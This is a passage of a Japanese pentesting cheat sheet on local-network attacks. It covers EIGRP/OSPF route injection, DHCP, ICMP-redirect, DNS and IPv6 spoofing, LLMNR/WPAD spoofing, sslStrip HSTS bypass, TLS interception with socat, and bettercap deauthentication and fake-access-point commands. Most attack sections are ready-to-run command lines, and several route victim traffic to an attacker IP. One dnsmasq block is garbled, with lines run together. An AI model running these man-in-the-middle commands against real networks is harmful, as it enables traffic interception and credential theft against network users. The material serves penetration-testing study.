**Cisco Systemsのエンジニアは、GLBPとHSRPの2つのFHRPプロトコルを開発しました。**

{{#ref}}
glbp-and-hsrp-attacks.md
{{#endref}}

### RIP

ルーティング情報プロトコル (RIP) の3つのバージョンが存在します: RIP, RIPv2, およびRIPng。RIPとRIPv2は、UDPを使用してポート520経由でピアにデータグラムを送信しますが、RIPngはIPv6マルチキャストを介してUDPポート521にデータグラムをブロードキャストします。MD5認証のサポートはRIPv2によって導入されました。一方、RIPngにはネイティブ認証が組み込まれておらず、代わりにIPv6内のオプションのIPsec AHおよびESPヘッダーに依存しています。

- **RIPとRIPv2:** 通信はポート520のUDPデータグラムを介して行われます。
- **RIPng:** IPv6マルチキャストを介してデータグラムをブロードキャストするためにUDPポート521を利用します。

RIPv2はMD5認証をサポートしている一方で、RIPngはネイティブ認証を含まず、IPv6内のIPsec AHおよびESPヘッダーに依存しています。

### EIGRP 攻撃

**EIGRP (Enhanced Interior Gateway Routing Protocol)** は動的ルーティングプロトコルです。**これは距離ベクトルプロトコルです。** **認証**がなく、パッシブインターフェースの設定がない場合、**侵入者**はEIGRPルーティングに干渉し、**ルーティングテーブルの中毒**を引き起こす可能性があります。さらに、EIGRPネットワーク（言い換えれば、自律システム）は**フラットで、ゾーンにセグメント化されていません**。**攻撃者がルートを注入**すると、そのルートは自律EIGRPシステム全体に**広がる**可能性があります。

EIGRPシステムを攻撃するには、**正当なEIGRPルーターとの隣接関係を確立する**必要があり、これにより基本的な偵察からさまざまな注入まで多くの可能性が開かれます。

[**FRRouting**](https://frrouting.org/) は、**BGP、OSPF、EIGRP、RIPおよびその他のプロトコルをサポートする仮想ルーターを実装することを可能にします。** これを攻撃者のシステムに展開するだけで、実際にルーティングドメイン内の正当なルーターのふりをすることができます。

{{#ref}}
eigrp-attacks.md
{{#endref}}

[**Coly**](https://code.google.com/p/coly/) は、EIGRP (Enhanced Interior Gateway Routing Protocol) ブロードキャストを傍受する機能を持っています。また、パケットの注入も可能で、これを利用してルーティング構成を変更できます。

### OSPF

Open Shortest Path First (OSPF) プロトコルでは、**MD5認証が一般的に使用され、ルーター間の安全な通信を確保します**。しかし、このセキュリティ対策は、LokiやJohn the Ripperのようなツールを使用して侵害される可能性があります。これらのツールはMD5ハッシュをキャプチャして解読することができ、認証キーを暴露します。このキーが取得されると、新しいルーティング情報を導入するために使用できます。ルートパラメータを設定し、侵害されたキーを確立するために、_Injection_ および _Connection_ タブがそれぞれ利用されます。

- **MD5ハッシュのキャプチャと解読:** LokiやJohn the Ripperのようなツールがこの目的で使用されます。
- **ルートパラメータの設定:** これは _Injection_ タブを通じて行われます。
- **侵害されたキーの設定:** キーは _Connection_ タブで設定されます。

### その他の一般的なツールとリソース

- [**Above**](https://github.com/c4s73r/Above): ネットワークトラフィックをスキャンし、脆弱性を見つけるためのツール
- **ネットワーク攻撃に関する** [**詳細情報**](https://github.com/Sab0tag3d/MITM-cheatsheet) を見つけることができます。

## **スプーフィング**

攻撃者は、偽のDHCP応答を送信してネットワークの新しいメンバーのすべてのネットワークパラメータ (GW、IP、DNS) を設定します。
```bash
Ettercap
yersinia dhcp -attack 2 #More parameters are needed
```
### ARP Spoofing

[前のセクション](./#arp-spoofing)を確認してください。

### ICMPRedirect

ICMP Redirectは、攻撃者がIPに到達する最良の方法であることを示すICMPパケットタイプ1コード5を送信することから成ります。次に、被害者がIPに連絡したい場合、攻撃者を通じてパケットを送信します。
```bash
Ettercap
icmp_redirect
hping3 [VICTIM IP ADDRESS] -C 5 -K 1 -a [VICTIM DEFAULT GW IP ADDRESS] --icmp-gw [ATTACKER IP ADDRESS] --icmp-ipdst [DST IP ADDRESS] --icmp-ipsrc [VICTIM IP ADDRESS] #Send icmp to [1] form [2], route to [3] packets sent to [4] from [5]
```
### DNS Spoofing

攻撃者は、被害者が要求するいくつか（またはすべて）のドメインを解決します。
```bash
set dns.spoof.hosts ./dns.spoof.hosts; dns.spoof on
```
**dnsmasqを使用して独自のDNSを構成する**
```bash
apt-get install dnsmasqecho "addn-hosts=dnsmasq.hosts" > dnsmasq.conf #Create dnsmasq.confecho "127.0.0.1   domain.example.com" > dnsmasq.hosts #Domains in dnsmasq.hosts will be the domains resolved by the Dsudo dnsmasq -C dnsmasq.conf --no-daemon
dig @localhost domain.example.com # Test the configured DNS
```
### ローカルゲートウェイ

システムやネットワークへの複数のルートが存在することがよくあります。ローカルネットワーク内のMACアドレスのリストを作成したら、_gateway-finder.py_を使用してIPv4フォワーディングをサポートするホストを特定します。
```
root@kali:~# git clone https://github.com/pentestmonkey/gateway-finder.git
root@kali:~# cd gateway-finder/
root@kali:~# arp-scan -l | tee hosts.txt
Interface: eth0, datalink type: EN10MB (Ethernet)
Starting arp-scan 1.6 with 256 hosts (http://www.nta-monitor.com/tools/arp-scan/)
10.0.0.100     00:13:72:09:ad:76       Dell Inc.
10.0.0.200     00:90:27:43:c0:57       INTEL CORPORATION
10.0.0.254     00:08:74:c0:40:ce       Dell Computer Corp.

root@kali:~/gateway-finder# ./gateway-finder.py -f hosts.txt -i 209.85.227.99
gateway-finder v1.0 http://pentestmonkey.net/tools/gateway-finder
[+] Using interface eth0 (-I to change)
[+] Found 3 MAC addresses in hosts.txt
[+] We can ping 209.85.227.99 via 00:13:72:09:AD:76 [10.0.0.100]
[+] We can reach TCP port 80 on 209.85.227.99 via 00:13:72:09:AD:76 [10.0.0.100]
```
### [LLMNR、NBT-NS、およびmDNSのスプーフィング](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)

DNSルックアップが失敗した場合のローカルホスト解決のために、Microsoftシステムは**Link-Local Multicast Name Resolution (LLMNR)**および**NetBIOS Name Service (NBT-NS)**に依存しています。同様に、**Apple Bonjour**および**Linuxゼロコンフィギュレーション**の実装は、ネットワーク内のシステムを発見するために**Multicast DNS (mDNS)**を利用します。これらのプロトコルは認証されておらず、UDP上でメッセージをブロードキャストするため、攻撃者によって悪意のあるサービスにユーザーをリダイレクトするために悪用される可能性があります。

Responderを使用して、ホストによって検索されるサービスを偽装し、偽の応答を送信することができます。\
[Responderを使用してサービスを偽装する方法についての詳細はこちらをお読みください](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)。

### [WPADのスプーフィング](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)

ブラウザは一般的に**Web Proxy Auto-Discovery (WPAD)プロトコルを使用して自動的にプロキシ設定を取得します**。これは、特に「http://wpad.example.org/wpad.dat」のようなURLを介してサーバーから構成詳細を取得することを含みます。このサーバーの発見は、クライアントによってさまざまなメカニズムを通じて行われる可能性があります：

- **DHCP**を介して、特別なコード252エントリを利用して発見が促進されます。
- **DNS**によって、ローカルドメイン内で_wpad_というラベルの付いたホスト名を検索します。
- **Microsoft LLMNRおよびNBT-NS**を介して、DNSルックアップが成功しない場合に使用されるフォールバックメカニズムです。

ツールResponderは、このプロトコルを利用して**悪意のあるWPADサーバー**として機能します。DHCP、DNS、LLMNR、およびNBT-NSを使用して、クライアントを誤導して接続させます。Responderを使用してサービスを偽装する方法についてさらに詳しくは、[こちらを確認してください](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)。

### [SSDPおよびUPnPデバイスのスプーフィング](spoofing-ssdp-and-upnp-devices.md)

ネットワーク内で異なるサービスを提供して、**ユーザーを騙してプレーンテキストの認証情報を入力させる**ことができます。**この攻撃に関する詳細は、[**SSDPおよびUPnPデバイスのスプーフィング**](spoofing-ssdp-and-upnp-devices.md)**をご覧ください。**

### IPv6隣接スプーフィング

この攻撃はARPスプーフィングに非常に似ていますが、IPv6の世界で行われます。被害者は、GWのIPv6が攻撃者のMACを持っていると考えることができます。
```bash
sudo parasite6 -l eth0 # This option will respond to every requests spoofing the address that was requested
sudo fake_advertise6 -r -w 2 eth0 <Router_IPv6> #This option will send the Neighbor Advertisement packet every 2 seconds
```
### IPv6ルーター広告のスプーフィング/フラッディング

一部のOSは、ネットワーク内で送信されたRAパケットからデフォルトでゲートウェイを設定します。攻撃者をIPv6ルーターとして宣言するには、次のコマンドを使用できます:
```bash
sysctl -w net.ipv6.conf.all.forwarding=1 4
ip route add default via <ROUTER_IPv6> dev wlan0
fake_router6 wlan0 fe80::01/16
```
### IPv6 DHCPスプーフィング

デフォルトでは、一部のOSはネットワーク内のDHCPv6パケットを読み取ってDNSを構成しようとします。これにより、攻撃者は自分自身をDNSとして構成するためにDHCPv6パケットを送信することができます。DHCPは被害者にIPv6も提供します。
```bash
dhcp6.spoof on
dhcp6.spoof.domains <list of domains>

mitm6
```
### HTTP (フェイクページとJSコードインジェクション)

## インターネット攻撃

### sslStrip

基本的にこの攻撃が行うことは、**ユーザー**が**HTTPS**バージョンに**リダイレクト**される**HTTP**ページに**アクセス**しようとした場合です。**sslStrip**は**クライアントとのHTTP接続**と**サーバーとのHTTPS接続**を**維持**するため、**プレーンテキスト**で接続を**スニッフィング**することができます。
```bash
apt-get install sslstrip
sslstrip -w /tmp/sslstrip.log --all - l 10000 -f -k
#iptables --flush
#iptables --flush -t nat
iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000
iptables -A INPUT -p tcp --destination-port 10000 -j ACCEPT
```
More info [here](https://www.blackhat.com/presentations/bh-dc-09/Marlinspike/BlackHat-DC-09-Marlinspike-Defeating-SSL.pdf).

### sslStrip+ と dns2proxy を使用した HSTS のバイパス

**sslStrip+ と dns2proxy** の **違い** は、**sslStrip** に対して、例えば _**www.facebook.com**_ を _**wwww.facebook.com**_ **にリダイレクト** し（**追加の** "**w**" に注意）、このドメインの **アドレスを攻撃者の IP** に設定することです。この方法で、**クライアント** は _**wwww.facebook.com**_ **（攻撃者）** に **接続** しますが、裏では **sslstrip+** が **www.facebook.com** との **実際の接続** を **維持** します。

この技術の **目的** は **HSTS を回避する** ことで、_**wwww**.facebook.com_ **は** ブラウザの **キャッシュ** に保存されないため、ブラウザは **HTTP での facebook 認証を実行するように騙されます**。\
この攻撃を実行するには、被害者が最初に [http://www.faceook.com](http://www.faceook.com) にアクセスしなければならないことに注意してください。これは、http ページ内のリンクを変更することで実行できます。

More info [here](https://www.bettercap.org/legacy/#hsts-bypass), [here](https://www.slideshare.net/Fatuo__/offensive-exploiting-dns-servers-changes-blackhat-asia-2014) and [here](https://security.stackexchange.com/questions/91092/how-does-bypassing-hsts-with-sslstrip-work-exactly).

**sslStrip または sslStrip+ はもう機能しません。これは、ブラウザに事前保存された HSTS ルールがあるためで、ユーザーが「重要な」ドメインに初めてアクセスする場合でも、HTTPS 経由でアクセスします。また、事前保存されたルールや他の生成されたルールは、** [**`includeSubdomains`**](https://hstspreload.appspot.com) **フラグを使用することができるため、以前の _**wwww.facebook.com**_ の例は、_**facebook.com**_ が `includeSubdomains` で HSTS を使用しているため、もはや機能しません。**

TODO: easy-creds, evilgrade, metasploit, factory

## ポートでの TCP リスン
```bash
sudo nc -l -p 80
socat TCP4-LISTEN:80,fork,reuseaddr -
```
## TCP + SSL ポートでリッスン

#### キーと自己署名証明書を生成する
```
FILENAME=server
# Generate a public/private key pair:
openssl genrsa -out $FILENAME.key 1024
# Generate a self signed certificate:
openssl req -new -key $FILENAME.key -x509 -sha256 -days 3653 -out $FILENAME.crt
# Generate the PEM file by just appending the key and certificate files:
cat $FILENAME.key $FILENAME.crt >$FILENAME.pem
```
#### 証明書を使用してリッスンする
```
sudo socat -v -v openssl-listen:443,reuseaddr,fork,cert=$FILENAME.pem,cafile=$FILENAME.crt,verify=0 -
```
#### 証明書を使用してリッスンし、ホストにリダイレクトする
```
sudo socat -v -v openssl-listen:443,reuseaddr,fork,cert=$FILENAME.pem,cafile=$FILENAME.crt,verify=0  openssl-connect:[SERVER]:[PORT],verify=0
```
時には、クライアントがCAが有効であることを確認すると、**CAによって署名された他のホスト名の証明書を提供する**ことができます。\
もう一つの興味深いテストは、**要求されたホスト名の証明書を自己署名で提供する**ことです。

他にテストすることは、有効なCAではない有効な証明書で証明書に署名しようとすることです。または、有効な公開鍵を使用し、Diffie-Hellmanのようなアルゴリズムを強制的に使用し（実際の秘密鍵で何も復号化する必要がないもの）、クライアントが実際の秘密鍵のプローブ（ハッシュのような）を要求したときに、偽のプローブを送信し、クライアントがこれを確認しないことを期待します。

## Bettercap
```bash
# Events
events.stream off #Stop showing events
events.show #Show all events
events.show 5 #Show latests 5 events
events.clear

# Ticker (loop of commands)
set ticker.period 5; set ticker.commands "wifi.deauth DE:AD:BE:EF:DE:AD"; ticker on

# Caplets
caplets.show
caplets.update

# Wifi
wifi.recon on
wifi.deauth BSSID
wifi.show
# Fake wifi
set wifi.ap.ssid Banana
set wifi.ap.bssid DE:AD:BE:EF:DE:AD
set wifi.ap.channel 5
set wifi.ap.encryption false #If true, WPA2
wifi.recon on; wifi.ap
```
### アクティブディスカバリーノート

UDPパケットが要求されたポートを持たないデバイスに送信されると、ICMP（ポート到達不能）が送信されることに注意してください。

### **ARPディスカバリ**

ARPパケットは、ネットワーク内で使用されているIPを発見するために使用されます。PCは各可能なIPアドレスにリクエストを送信し、使用されているものだけが応答します。

### **mDNS（マルチキャストDNS）**

Bettercapは、**\_services\_.dns-sd.\_udp.local**を要求するMDNSリクエストを送信します（X msごと）。このパケットを見るマシンは通常、このリクエストに応答します。その後、「services」に応答するマシンを検索します。

**ツール**

- Avahi-browser (--all)
- Bettercap (net.probe.mdns)
- Responder

### **NBNS（NetBiosネームサーバー）**

Bettercapは、名前「CKAAAAAAAAAAAAAAAAAAAAAAAAAAA」を要求するパケットをポート137/UDPにブロードキャストします。

### **SSDP（シンプルサービスディスカバリープロトコル）**

Bettercapは、すべての種類のサービスを検索するSSDPパケットをブロードキャストします（UDPポート1900）。

### **WSD（ウェブサービスディスカバリー）**

Bettercapは、サービスを検索するWSDパケットをブロードキャストします（UDPポート3702）。

## 参考文献

- [https://medium.com/@in9uz/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9](https://medium.com/@in9uz/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9)
- **ネットワークセキュリティ評価: ネットワークを知る（第3版）**
- **実践的IoTハッキング: IoT攻撃の決定版ガイド。著者: Fotios Chantzis, Ioannis Stais, Paulino Calderon, Evangelos Deirmentzoglou, Beau Wood**
- [https://medium.com/@cursedpkt/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9](https://medium.com/@cursedpkt/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9)



{{#include ../../banners/hacktricks-training.md}}
